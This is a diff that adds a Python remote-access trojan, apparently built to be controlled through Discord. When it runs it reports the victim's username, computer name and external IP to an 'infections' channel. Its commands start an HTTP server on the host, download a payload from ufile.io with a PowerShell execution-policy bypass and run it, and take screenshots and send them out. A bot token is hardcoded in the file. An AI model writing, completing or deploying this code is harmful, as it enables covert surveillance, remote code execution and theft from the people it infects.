@@ -1,0 +1,95 @@
+import os
+import time
+import json
+import discord
+import requests
+import threading
+import urllib
+from discord.ext import commands
+from discord.utils import get
+import threading
+from PIL import ImageGrab
+
+
+
+
+
+external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
+pc_username = os.getenv('UserName')
+pc_name = os.getenv('COMPUTERNAME')
+
+class MyClient(discord.Client):
+    async def on_ready(self):
+        print('Logged on as {0}!'.format(self.user))
+        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name='C2 Commands'))
+        infections=client.get_channel(864979604174536735)
+        await  infections.send(f"new infection Username- {pc_username}, PC name- {pc_name}, ip address-{external_ip}")
+
+    async def on_message(self,message):
+
+      if message.content.startswith('$http'):
+        if str(message.channel)==str(external_ip.replace(".","")):
+          port=8090
+          os.popen(f"python3 -m http.server {port}")
+          httpservers=client.get_channel(866626352417341480)
+          await httpservers.send(f"http server started at http://{external_ip}:{port}")
+          await message.delete()
+        else:
+          await message.delete()
+          await message.channel.send("wrong channel try again")
+
+      if message.content.startswith('$payloader '):
+        if str(message.channel)==str(external_ip.replace(".","")):
+          content=message.content.replace("$payloader "," ")
+          split=content.split(".")
+          payload_type=split[1]
+          payload=split[0]+"."+split[1]
+          print(payload)
+          payloading=client.get_channel(866629962734764044)
+          os.popen(f"powershell -executionpolicy bypass -command Invoke-WebRequest -Uri 'https://ufile.io/ve1a6k6g' -OutFile '{payload}'")
+          time.sleep(3)
+          if payload_type==(".py"):
+            os.popen(f"python3 {payload}")
+          else:
+            if payload_type==(".exe"):
+              os.popen(f"start {payload}")
+            else:
+              if payload_type==(".jar"):
+                os.popen(f"java -jar {payload}")
+          await payloading.send(f"payload {payload} has been dropped")
+          await message.delete()
+        else:
+          await message.delete()
+          await message.channel.send("wrong channel try again")
+          
+
+      if message.content.startswith('$help'):
+        commands=["help-show this message","http-start http server","payloader-drop payload","attack-attack target"]
+        await message.channel.send(f"commands:{commands}")
+        await message.delete()
+
+      if message.content.startswith('$attack '):
+        target=message.content.replace("$attack ","")
+        Guild=message.guild
+        await Guild.create_text_channel(target)
+        await message.delete()
+      
+      if message.content.startswith("$screenshot"):
+        if str(message.channel)==str(external_ip.replace(".","")):
+         snapshot = ImageGrab.grab()
+         save_path = ("MySnapshot.jpg")
+         snapshot.save(save_path)
+         picchan=client.get_channel(866631912151973939)
+         with open('MySnapshot.jpg', 'rb') as f:
+            picture = discord.File(f)
+            await picchan.send(file=picture)
+            await message.delete()
+        else:
+          await message.delete()
+          await message.channel.send("wrong channel try again")
+      
+
+      
+
+client = MyClient()
+client.run('ODYyODE2ODg4ODg3MzEyMzg1.YOd22A.DesWxoKw9S4DOV1QPV54MX_TQtA')
